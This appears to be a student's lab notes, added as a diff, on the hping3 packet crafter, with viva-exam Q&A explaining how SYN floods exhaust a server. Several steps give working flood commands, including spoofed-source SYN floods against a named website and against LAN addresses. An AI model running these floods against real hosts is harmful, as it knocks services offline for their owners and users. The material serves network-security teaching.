@@ -1,0 +1,69 @@
+step1:
+Go in /etc 
+cd /etc
+Changes the current directory to /etc, which holds system-wide configuration files.
+
+step2:
+install hping
+sudo apt-get install hping3 -y   
+Installs the hping3 utility on Debian/Ubuntu-based systems using the apt package manager without prompting for confirmation.
+
+step3: 
+sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
+Performs a SYN Flood DDoS attack on port 21 of the target, sending 10,000 packets with 120 bytes of data, a window size of 64, and a random source IP address.
+
+step4:
+sudo hping3 -S --flood  -V www.hping3testsite.com 
+Launches an indefinite SYN flood against the target, displaying verbose output for each packet sent.
+
+step5:
+sudo hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com
+Sends a massive flood of TCP packets to the target using a combination of SYN, PUSH, and URG flags from random source IPs, with verbose output.
+
+step6:
+sudo hping3 10.0.2.15
+Performs a basic TCP probe (ping) to host 10.0.2.15 on port 0, showing responses like a regular ping but using TCP.
+
+step7:
+hping3 10.0.2.15
+Performs a basic TCP probe (ping) to host 10.0.2.15 on port 0 as the current user (may require root privileges on some systems/operations).
+
+step8:
+sudo ping 10.0.2.15
+Sends standard ICMP echo request packets to host 10.0.2.15 to check connectivity and latency.
+
+step9:
+sudo hping3 192.168.43.24 --flood -p 80
+Executes an indefinite SYN flood attack on port 80 of the target host 192.168.43.24
+
+
+hping3 is a network tool used to send custom TCP/IP packets for testing, scanning, and security auditing. hping3 can be used to test or perform DOS attacks.
+hping3 should be used to… 
+Perform ping or traceroute using TCP, UDP, or ICMP packets.
+Exploit known vulnerabilties of TCP/IP stacks
+Test firewalls and its rules
+Analyze networks
+
+Concept: hping3 is an advanced "packet crafter" and analysis tool. Think of it as ping on steroids. While ping can only send basic ICMP "echo" packets, hping3 can create and send custom TCP, UDP, ICMP, and RAW-IP packets with full control over flags, ports, and other options.
+
+Why We Use It:
+Firewall Testing: To see which ports are open or blocked and how the firewall responds to specific packet types (e.g., "Is port 80 open for SYN packets?").
+Network Scanning: To discover hosts and services in ways Nmap might not.
+Simulating DoS Attacks: To perform stress tests, like the SYN Flood attack.
+
+Your Experiment:
+You are simulating a SYN Flood (a type of Denial of Service attack).
+sudo hping3 -S --flood -p 21 --rand-source www.hping3testsite.com
+-S: Send only SYN packets (the first step in a TCP connection).
+--flood: Send packets as fast as possible, without waiting for replies.
+-p 21: Target port 21 (FTP).
+--rand-source: IP Spoofing. Use a random source IP address for every single packet.
+How the attack works:
+The target server receives thousands of SYN packets from fake IPs. It replies to each fake IP with a SYN-ACK and keeps the connection "half-open," reserving resources. It quickly runs out of resources trying to manage all these fake half-open connections and can no longer serve legitimate users.
+
+Potential Viva Questions:
+Q: Why is hping3 --flood --rand-source a DoS attack?
+A: It's a SYN Flood. By sending thousands of SYN packets (--flood) from fake IPs (--rand-source), it forces the server to use up all its memory and CPU resources to manage "half-open" connections that will never be completed. This exhausts the server's resources, causing it to "deny service" to real users.
+
+Q: What is the difference between ping and hping3?
+A: ping only uses ICMP to check if a host is alive. hping3 is a packet crafter that can send custom TCP, UDP, and ICMP packets, allowing for advanced firewall testing and attack simulation.
